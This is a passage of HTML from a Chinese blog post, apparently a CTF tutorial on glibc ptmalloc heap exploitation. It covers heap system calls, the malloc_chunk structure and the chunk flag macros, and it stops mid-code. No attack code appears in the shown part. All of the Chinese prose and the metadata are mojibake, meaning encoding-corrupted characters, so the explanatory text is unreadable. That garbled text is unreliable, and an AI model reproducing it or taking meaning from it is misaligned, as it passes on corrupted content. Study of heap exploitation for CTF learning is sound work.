

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
  <link rel="icon" href="/img/avatar.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="arttnba3">
  <meta name="keywords" content="">
  
    <meta name="description" content="ä¸è¦æ»¡è¶³äºåšä¸€ä¸ª ptmalloc æ‹³å‡»æ‰‹">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€PWN.0x01ã€‘ç®€æ˜“ Glibc heap exploit ç¬”è®°">
<meta property="og:url" content="https://arttnba3.github.io/2021/05/10/PWN-0X01-GLIBC_HEAP-EXPLOIT/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="ä¸è¦æ»¡è¶³äºåšä¸€ä¸ª ptmalloc æ‹³å‡»æ‰‹">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png">
<meta property="article:published_time" content="2021-05-09T17:56:56.000Z">
<meta property="article:modified_time" content="2023-08-13T08:31:00.000Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="python">
<meta property="article:tag" content="ä¿¡æ¯å®‰å…¨">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="å †">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="Use After Free">
<meta property="article:tag" content="ret2libc">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="å †é£æ°´">
<meta property="article:tag" content="gotè¡¨åŠ«æŒ">
<meta property="article:tag" content="æ ˆè¿ç§»">
<meta property="article:tag" content="_IO_FILE hijack">
<meta property="article:tag" content="Fastbin Attack">
<meta property="article:tag" content="FSOP">
<meta property="article:tag" content="Heap Overflow">
<meta property="article:tag" content="House of Force">
<meta property="article:tag" content="House of Orange">
<meta property="article:tag" content="House of Spirit">
<meta property="article:tag" content="off by one">
<meta property="article:tag" content="one_gadget">
<meta property="article:tag" content="Unlink">
<meta property="article:tag" content="Unsorted bin Attack">
<meta property="article:tag" content="House of Botcake">
<meta property="article:tag" content="House of Einherjar">
<meta property="article:tag" content="House of Husk">
<meta property="article:tag" content="House of Kiwi">
<meta property="article:tag" content="House of Lore">
<meta property="article:tag" content="House of Rabbit">
<meta property="article:tag" content="House of Roman">
<meta property="article:tag" content="House of Storm">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/backward_consolidate.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>ã€PWN.0x01ã€‘ç®€æ˜“ Glibc heap exploit ç¬”è®° - arttnba3&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"arttnba3.github.io","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"Â§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.1.1"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 80vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>arttnba3&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                é¦–é¡µ
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                å½’æ¡£
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                åˆ†ç±»
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                æ ‡ç­¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                å…³äº
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                å‹é“¾
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/atom.xml">
                <i class="iconfont icon-rss"></i>
                rss
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/program_virtual_address_memory_space.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="ã€PWN.0x01ã€‘ç®€æ˜“ Glibc heap exploit ç¬”è®°"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2021-05-10 03:56" pubdate>
          2021å¹´5æœˆ10æ—¥ å‡Œæ™¨
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          78k å­—
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          654 åˆ†é’Ÿ
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> æ¬¡
        </span>
        
      
    
  </div>


        
      </div>

      
        <div class="scroll-down-bar">
          <i class="iconfont icon-arrowdown"></i>
        </div>
      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">ã€PWN.0x01ã€‘ç®€æ˜“ Glibc heap exploit ç¬”è®°</h1>
            
              <p class="note note-info">
                
                  
                    æœ¬æ–‡æœ€åæ›´æ–°äºï¼š2023å¹´8æœˆ13æ—¥ æ™šä¸Š
                  
                
              </p>
            
            
              <div class="markdown-body">
                
                <p>ä¸è¦æ»¡è¶³äºåšä¸€ä¸ª ptmalloc æ‹³å‡»æ‰‹</p>
<span id="more"></span>

<h1 id="0x00-å†™åœ¨å¼€å§‹ä¹‹å‰"><a href="#0x00-å†™åœ¨å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.å†™åœ¨å¼€å§‹ä¹‹å‰"></a>0x00.å†™åœ¨å¼€å§‹ä¹‹å‰</h1><p>è¿™ç¯‡åšå®¢å…¶å®æ—©åœ¨<strong>20å¹´å¹´æœ«</strong>çš„æ—¶å€™å°±å·²ç»å†™å¥½äº†å¤§è‡´çš„æ¡†æ¶ï¼Œä¸€ç›´æƒ³ç€ç­‰å“ªå¤©å®Œå–„äº†å†å‘å‡ºæ¥ï¼Œä½†æ˜¯åé¢ä¸€ğŸ•Šå†ğŸ•Šä¸€ç›´æ²¡èƒ½å¤Ÿå®Œæˆï¼Œåªåœ¨åšå®¢å­˜æ¡£ä¸Šæ”¾äº†ä¸€ä¸ª<a href="(https://archive.next.arttnba3.cn/2021/02/24/%E3%80%90CTF%E8%B5%84%E6%96%99-0x0002%E3%80%91%E7%AE%80%E6%98%93Linux%E5%A0%86%E5%88%A9%E7%94%A8%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8Bby%20arttnba3/)">åŠæˆå“</a>ï¼Œä¸€ç›´æƒ³ç€ç­‰æœ‰æ—¶é—´äº†å†è¡Œè¡¥å…¨ï¼Œå´æœªæ›¾æƒ³åˆ°è¶Šæ¥è¶Šå¿™äº†ï¼Œä¸å…¨çš„è®¡åˆ’å´ä¹Ÿæ˜¯é¥é¥æ— æœŸï¼Œåªå¥½ç¨ä½œä¿®æ”¹å…ˆæ‰”ä¸Šæ¥</p>
<p>å¸Œæœ›ä»¥åæœ‰æ—¶é—´èƒ½æŠŠåé¢çš„ç»™è¡¥å…¨äº†ç½¢ï¼ˆğŸ•ŠğŸ•ŠğŸ•Šï¼‰</p>
<blockquote>
<h2 id="ç¬¬ä¸€ç‰ˆå¼•è¨€"><a href="#ç¬¬ä¸€ç‰ˆå¼•è¨€" class="headerlink" title="ç¬¬ä¸€ç‰ˆå¼•è¨€"></a>ç¬¬ä¸€ç‰ˆå¼•è¨€</h2><p>å¯¹äºå †ç®¡ç†å™¨çš„åˆ©ç”¨ä¸€ç›´ä»¥æ¥éƒ½æ˜¯CTFæ¯”èµ›ä¸­çš„çƒ­ç‚¹ï¼Œ<del>æŒ‰æˆ‘çš„æ„Ÿå—æ¥çœ‹é€šå¸¸æƒ…å†µä¸‹å¤§æ¯”èµ›çš„ç­¾åˆ°é¢˜éƒ½ä¼šæ˜¯ä¸€é“easy heap</del>ï¼ŒåŒæ—¶ç”±äºå…¶çŸ¥è¯†ç‚¹çš„ç¹å¤å†—æ‚ï¼Œå¯¹äºLinuxçš„å †ç®¡ç†å™¨çš„åˆ©ç”¨ä¹Ÿæ˜¯Pwnerä»¬çš„å­¦ä¹ è·¯å¾„ä¸Šçš„ä¸€ä¸ªç“¶é¢ˆï¼Œå› æ­¤æœ¬äººå†³å®šå°†ä¸€äº›åŸºç¡€çš„å¥—è·¯è®°å½•ä¸‹æ¥ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åŠ©æ›´å¤šåˆå…¥pwnä¸–ç•Œçš„èŒæ–°ä»¬å°½å¿«æŒæ¡å¯¹äºå †ç®¡ç†å™¨çš„ç¾å¦™åˆ©ç”¨</p>
<p>å½“ç„¶ï¼Œæœ¬ç¯‡åšæ–‡å¹¶ä¸ä¸“ä¸šï¼Œä»…ä»…æ˜¯è®°å½•ä¸‹äº†ç¬”è€…æ‰€è§è¿‡çš„ä¸€äº›è¾ƒä¸ºå¸¸è§çš„åˆ©ç”¨å¥—è·¯ï¼Œä»…é€‚ç”¨äºåˆè¯†å †åˆ©ç”¨çš„èŒæ–°ï¼Œå¯¹äºå¯¹å †ç®¡ç†å™¨å·²ç»æœ‰ç€ä¸€å®šçš„äº†è§£æˆ–è€…å†å¾€ä¸Šçš„å¤§å¸ˆå‚…ä»¬è¿˜è¯·æ— è§†</p>
<p>æœ¬ç¯‡ä»…æ¶‰åŠå¯¹äºä¼ ç»Ÿ Glibc ä¸­ ptmalloc2 çš„åˆ©ç”¨ï¼Œä¸åŒ…å«å…¶ä»–ç±»å‹å †ç®¡ç†å™¨ï¼ˆå¦‚tcmallocç­‰ï¼‰çš„åˆ©ç”¨æ‰‹æ®µ</p>
</blockquote>
<h2 id="å‰ç½®çŸ¥è¯†ï¼š"><a href="#å‰ç½®çŸ¥è¯†ï¼š" class="headerlink" title="å‰ç½®çŸ¥è¯†ï¼š"></a>å‰ç½®çŸ¥è¯†ï¼š</h2><ul>
<li><p>åŸºæœ¬çš„ pwn çŸ¥è¯†</p>
</li>
<li><p>x86æ±‡ç¼–è¯­è¨€åŸºç¡€</p>
</li>
<li><p>Cè¯­è¨€åŸºç¡€</p>
</li>
<li><p>æ•°æ®ç»“æ„åŸºç¡€ï¼ˆ<strong>ç¬”è€…ä¸ªäººæ¨è</strong>è‡³å°‘è¦Leetcodeä¸Šçš„é“¾è¡¨é¢˜èƒ½å†™ä¸­ç­‰éš¾åº¦çš„æ°´å¹³ï¼ˆOIå¤§çŠ‡è¯·æ— è§†ï¼‰ï¼‰</p>
</li>
</ul>
<h1 id="0x01-å †å†…å­˜çš„åˆ†é…-é‡Šæ”¾"><a href="#0x01-å †å†…å­˜çš„åˆ†é…-é‡Šæ”¾" class="headerlink" title="0x01.å †å†…å­˜çš„åˆ†é…&amp;é‡Šæ”¾"></a>0x01.å †å†…å­˜çš„åˆ†é…&amp;é‡Šæ”¾</h1><p>ä¸æ•°æ®ç»“æ„ä¸­çš„å †ä¸åŒï¼Œè¿™é‡Œæˆ‘ä»¬æ‰€è¯´çš„ã€å †ã€‘æŒ‡çš„æ˜¯è¿›ç¨‹è¿è¡Œè¿‡ç¨‹ä¸­ä¸ºåŠ¨æ€å†…å­˜åˆ†é…æ‰€æœåŠ¡çš„å†…å­˜æ®µï¼Œåœ¨ Linux ä¸‹åŒ…æ‹¬ä¼ ç»Ÿçš„ <code>heap</code> æ®µ ä¸ <code>Memory Mapping Segment</code> æ®µï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆæœ¬å›¾æ¥è‡ªCTF wikiï¼‰ï¼š</p>
<p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/program_virtual_address_memory_space.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="å †ç›¸å…³ç³»ç»Ÿè°ƒç”¨"><a href="#å †ç›¸å…³ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å †ç›¸å…³ç³»ç»Ÿè°ƒç”¨"></a>å †ç›¸å…³ç³»ç»Ÿè°ƒç”¨</h2><h3 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h3><p>brkç³»ç»Ÿè°ƒç”¨ç”¨ä»¥åœ¨ heap æ®µå°†è¦è€—å°½æ—¶å¯¹å…¶è¿›è¡Œæ‹“å±•ï¼Œå…¶å¢é•¿æ–¹å‘ä¸º<strong>å‘é«˜åœ°å€å¢é•¿</strong></p>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>mmap ç³»ç»Ÿè°ƒç”¨ç”¨ä»¥åœ¨å†…å­˜ä¸­æ˜ å°„ä¸€å—åŒºåŸŸï¼Œå½“æˆ‘ä»¬å°è¯•ç›´æ¥åˆ†é…è¾ƒå¤§çš„å†…å­˜å—æ—¶ ptmalloc ä¾¿ä¼šé€šè¿‡ mmap ç³»ç»Ÿè°ƒç”¨åœ¨å†…å­˜ä¸­åˆ†é…ä¸€å—åŒ¿åå†…å­˜å—</p>
<h2 id="å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨"><a href="#å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨" class="headerlink" title="å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨"></a>å†…å­˜åˆ†é…åŸºæœ¬æ€æƒ³ï¼šé‡ç”¨</h2><p>å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œ</p>
<ol>
<li>å“åº”ç”¨æˆ·çš„ç”³è¯·å†…å­˜è¯·æ±‚ã€‚å †ç®¡ç†å™¨è´Ÿè´£å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜ï¼Œç„¶åå°†å…¶è¿”å›ç»™ç”¨æˆ·ç¨‹åºï¼Œä½†æ˜¯é¢‘ç¹çš„ç³»ç»Ÿè°ƒç”¨ä¼šé€ æˆå¤§é‡çš„å¼€é”€ã€‚ä¸ºäº†ä¿æŒå†…å­˜ç®¡ç†çš„é«˜æ•ˆæ€§ï¼Œå†…æ ¸ä¸€èˆ¬éƒ½ä¼š<strong>é¢„å…ˆåˆ†é…å¾ˆå¤§çš„ä¸€å—è¿ç»­çš„å†…å­˜</strong>ï¼Œç„¶å<strong>è®©å †ç®¡ç†å™¨é€šè¿‡æŸç§ç®—æ³•ç®¡ç†è¿™å—å†…å­˜</strong>ã€‚åªæœ‰å½“å‡ºç°äº†å †ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œå †ç®¡ç†å™¨æ‰ä¼šå†æ¬¡ä¸æ“ä½œç³»ç»Ÿè¿›è¡Œäº¤äº’ã€‚</li>
<li>ç®¡ç†ç”¨æˆ·æ‰€é‡Šæ”¾çš„å†…å­˜ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·é‡Šæ”¾çš„å†…å­˜å¹¶ä¸æ˜¯ç›´æ¥è¿”è¿˜ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œè€Œæ˜¯ç”±å †ç®¡ç†å™¨è¿›è¡Œç®¡ç†ã€‚è¿™äº›é‡Šæ”¾çš„å†…å­˜å¯ä»¥æ¥å“åº”ç”¨æˆ·æ–°ç”³è¯·çš„å†…å­˜çš„è¯·æ±‚ã€‚</li>
</ol>
<h1 id="0x02-å †ç›¸å…³æ•°æ®ç»“æ„"><a href="#0x02-å †ç›¸å…³æ•°æ®ç»“æ„" class="headerlink" title="0x02.å †ç›¸å…³æ•°æ®ç»“æ„"></a>0x02.å †ç›¸å…³æ•°æ®ç»“æ„</h1><p><strong>æ­¤éƒ¨åˆ†å†…å®¹æ¨èé˜…è¯»ï¼š<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/01/15/NOTE-0X00-MALLOC-2.23-PART-I/"> glibc2.23mallocæºç åˆ†æ - Iï¼šå †å†…å­˜çš„åŸºæœ¬ç»„ç»‡å½¢å¼ </a>è¿›è¡Œæ·±å…¥ç†è§£ï¼Œè¿™é‡Œåªæ˜¯å¸®å¤§å®¶äº†è§£ä¸ªå¤§æ¦‚çš„æ ·å­</strong></p>
<h2 id="1-chunk"><a href="#1-chunk" class="headerlink" title="1.chunk"></a>1.chunk</h2><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†å‘ç³»ç»Ÿæ‰€ç”³è¯·å¾—åˆ°çš„å†…å­˜å—ç§°ä¹‹ä¸ºä¸€ä¸ª <strong>chunk</strong></p>
<h3 id="åŸºæœ¬ç»“æ„"><a href="#åŸºæœ¬ç»“æ„" class="headerlink" title="åŸºæœ¬ç»“æ„"></a>åŸºæœ¬ç»“æ„</h3><p>åœ¨ ptmalloc2 çš„å†…éƒ¨ä½¿ç”¨malloc_chunkç»“æ„ä½“æ¥è¡¨ç¤ºï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span> &#123;</span><br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd</span>;</span>         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk</span>;</span><br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">fd_nextsize</span>;</span> <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_chunk</span>* <span class="hljs-title">bk_nextsize</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure>

<p>å„å­—æ®µå«ä¹‰å¦‚ä¸‹ï¼š</p>
<ul>
<li><strong>prev_size</strong>:ç”¨ä»¥ä¿å­˜å‰ä¸€ä¸ªå†…å­˜ç‰©ç†åœ°å€ç›¸é‚»çš„chunkçš„sizeï¼Œ<strong>ä»…åœ¨è¯¥chunkä¸ºfreeçŠ¶æ€æ—¶ä¼šè¢«ä½¿ç”¨åˆ°</strong></li>
<li><strong>size</strong>ï¼šé¡¾åæ€ä¹‰ï¼Œç”¨ä»¥ä¿å­˜è¿™ä¸ªchunkçš„<strong>æ€»çš„å¤§å°ï¼Œå³åŒæ—¶åŒ…å«chunkå¤´</strong>ï¼ˆ<strong>prev_size + size</strong>ï¼‰<strong>å’Œchunkå‰©ä½™éƒ¨åˆ†çš„å¤§å°</strong></li>
<li><strong>fd</strong>&amp;&amp;<strong>bk</strong>ï¼š<strong>ä»…åœ¨åœ¨chunkè¢«freeåä½¿ç”¨</strong>ï¼Œç”¨ä»¥è¿æ¥å…¶ä»–çš„chunkï¼Œ<strong>ä¹Ÿå°±æ˜¯è¯´å½“chunkå¤„äºè¢«ä½¿ç”¨çš„çŠ¶æ€æ—¶è¯¥å­—æ®µæ— æ•ˆï¼Œè¢«ç”¨ä»¥å­˜å‚¨ç”¨æˆ·çš„æ•°æ®</strong></li>
<li><strong>fd_nextsize</strong>&amp;&amp;<strong>bk_nextsize</strong>ï¼šä»…åœ¨åœ¨chunkè¢«freeåä½¿ç”¨ï¼Œç”¨ä»¥è¿æ¥å…¶ä»–çš„chunk</li>
</ul>
<p>ç”±äºæœ€åçš„ä¸¤ä¸ªå˜é‡ä»…ç”¨äºè¾ƒå¤§çš„freeçš„chunkï¼Œæ•…æˆ‘ä»¬å…ˆæš‚ä¸”å¿½ç•¥</p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥çŸ¥é“ï¼š<strong>ä¸€ä¸ªchunkåœ¨å†…å­˜ä¸­å¤§æ¦‚æ˜¯é•¿è¿™ä¸ªæ ·å­çš„</strong>ï¼š</p>
<p><img src="https://i.loli.net/2020/12/18/MAmvtL1zrpo9sFV.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>å…¶ä¸­ prev_size å­—æ®µä¸ size å­—æ®µè¢«ç§°ä¹‹ä¸º chunk headerï¼Œç”¨ä»¥å­˜å‚¨ chunk ç›¸å…³æ•°æ®ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†æ‰æ˜¯ç³»ç»ŸçœŸæ­£è¿”å›ç»™ç”¨æˆ·è¿›è¡Œä½¿ç”¨çš„éƒ¨åˆ†</p>
<h4 id="å†…å­˜å¯¹é½"><a href="#å†…å­˜å¯¹é½" class="headerlink" title="å†…å­˜å¯¹é½"></a>å†…å­˜å¯¹é½</h4><p>å® <strong>MALLOC_ALIGNMENT</strong> å®šä¹‰äº†chunkåœ¨å†…å­˜ä¸­å¯¹é½çš„å­—èŠ‚æ•°ï¼Œä¸€èˆ¬æ¥è¯´ç®—å‡ºæ¥éƒ½æ˜¯<strong>å¯¹ 2 * SIZE_SZ å¯¹é½</strong>ï¼Œå³ <strong>32 ä½ä¸‹ 8 å­—èŠ‚å¯¹é½ï¼Œ64 ä½ä¸‹ 16 å­—èŠ‚å¯¹é½</strong></p>
<h4 id="æ ‡å¿—ä½å®šä¹‰åŠç›¸å…³å®"><a href="#æ ‡å¿—ä½å®šä¹‰åŠç›¸å…³å®" class="headerlink" title="æ ‡å¿—ä½å®šä¹‰åŠç›¸å…³å®"></a>æ ‡å¿—ä½å®šä¹‰åŠç›¸å…³å®</h4><p>æˆ‘ä»¬çŸ¥é“å¯¹äºä¸€ä¸ª malloc_chunk è€Œè¨€å…¶ size å­—æ®µåº”å½“ä¸ MALLOC_ALIGNMENT ï¼ˆ32 ä½ä¸‹ä¸º 8 å­—èŠ‚ï¼Œ64 ä½ä¸‹ä¸º16å­—èŠ‚ï¼‰å¯¹é½ï¼Œè€Œåœ¨è¿™æ ·çš„æƒ…å†µä¸‹ä¸€ä¸ª chunk çš„ size å­—æ®µçš„ä½ 3&#x2F;4ï¼ˆ32&#x2F;64ä½ç³»ç»Ÿï¼‰ä½å°†ä¼šæ°¸è¿œä¸º0ï¼Œæ— æ³•å¾—åˆ°å……åˆ†çš„åˆ©ç”¨</p>
<p>å› æ­¤ï¼Œ<del>å‡ºäºèƒ½å‹æ¦¨ä¸€ç‚¹ç©ºé—´æ˜¯ä¸€ç‚¹ç©ºé—´çš„æ€æƒ³ï¼Œ</del>ä¸€ä¸ª chunk çš„ <strong>size å­—æ®µçš„ä½ä¸‰ä½ç”¨ä»¥ä¿å­˜ chunk ç›¸å…³çš„ä¸‰ä¸ªçŠ¶æ€</strong>ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   --------------- Physical chunk operations ---------------</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREV_INUSE 0x1</span><br><br><span class="hljs-comment">/* extract inuse bit of previous chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IS_MMAPPED 0x2</span><br><br><span class="hljs-comment">/* check for mmap()&#x27;ed chunk */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span><br><br><br><span class="hljs-comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span><br><span class="hljs-comment">   from a non-main arena.  This is only set immediately before handing</span><br><span class="hljs-comment">   the chunk to the user, if necessary.  */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NON_MAIN_ARENA 0x4</span><br><br><span class="hljs-comment">/* check for 